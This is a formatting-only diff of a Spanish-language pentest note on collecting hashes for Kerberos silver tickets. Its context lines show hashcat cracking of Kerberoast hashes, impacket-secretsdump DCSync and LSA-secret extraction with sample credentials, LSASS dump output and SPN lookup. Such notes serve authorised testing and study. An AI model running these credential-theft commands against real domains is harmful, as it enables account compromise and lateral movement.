@@ -17,7 +17,7 @@ linked:
 
 # Silver Ticket - Hash Collection
 
-***
+---
 
 ## Kerberoasting → crack
 
@@ -38,7 +38,7 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
 python3 -c "import hashlib; print(hashlib.new('md4', 'cracked_pass'.encode('utf-16le')).hexdigest())"
 ```
 
-___
+---
 
 ## DCSync (computer / service account)
 
@@ -57,7 +57,7 @@ impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-d
 # aes128_hmac: ...
 ```
 
-___
+---
 
 ## LSASS dump
 
@@ -76,7 +76,7 @@ ___
 # [00000003] Primary / NTLM : abc123HASH  ← target para silver
 ```
 
-___
+---
 
 ## LSA Secrets (computer account local)
 
@@ -96,7 +96,7 @@ impacket-secretsdump corp.local/localadmin:'P@ssw0rd'@web01.corp.local
 # _SC_mssqlsvc: cleartext o hash de service account
 ```
 
-___
+---
 
 ## Verificar hash obtenido
 
@@ -106,4 +106,4 @@ ___
 | Resolve SPN | `impacket-GetUserSPNs corp.local/user:'pass'@DC -target-domain corp.local` | Confirmar SPN del target. |
 ^st-hash-verify
 
-***
+---
